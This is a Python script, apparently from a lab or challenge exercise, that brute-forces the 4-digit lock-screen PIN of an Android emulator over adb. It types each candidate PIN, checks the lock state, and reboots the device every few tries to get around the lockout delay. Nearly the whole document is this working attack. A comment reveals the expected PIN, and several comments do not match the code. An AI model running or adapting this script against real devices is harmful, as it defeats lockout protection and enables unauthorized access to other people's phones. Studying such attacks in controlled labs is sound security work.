from subprocess import PIPE, Popen
import time


def cmdline(cmd, sh=True):
    """ Execute command @cmd and return output using Popen() """
    process = Popen(args=cmd, stdout=PIPE, shell=sh)
    r = process.communicate()[0].decode()
    #print(r)
    return r

def is_locked():
    """ Return true if AVD is locked """
    time.sleep(0.3)
    cmd = "adb shell service call trust 7"
    # https://android.stackexchange.com/questions/191086/adb-commands-to-get-screen-state-and-locked-state
    return "1" in cmdline(cmd)

def test_code(code):
    """ Test a given PIN code on AVD """
    cmd = f"adb shell input text {code} && adb shell input keyevent 66"
    print(f"[Test] {code}/9999")
    cmdline(cmd)

for c in range(668, 10000):  # From 0 to 9999 ; Note correct is 0672
    code = str(c).zfill(4)  # PIN is 4 digits long
    r = test_code(code)
    if not is_locked():  # Phone has been unlocked
        print(f"[+] Code is {code}")
        break  # Exit
    if ((c+1) % 4 == 0):  # Every 5 try, reboot phone (bypass 30 sec waiting)
        cmdline("adb reboot")
        time.sleep(8)
        cmdline("adb shell input swipe 540 1600 540 100 150")  # Swipe Up
    else:
        time.sleep(0.5)  # Wait before next attemp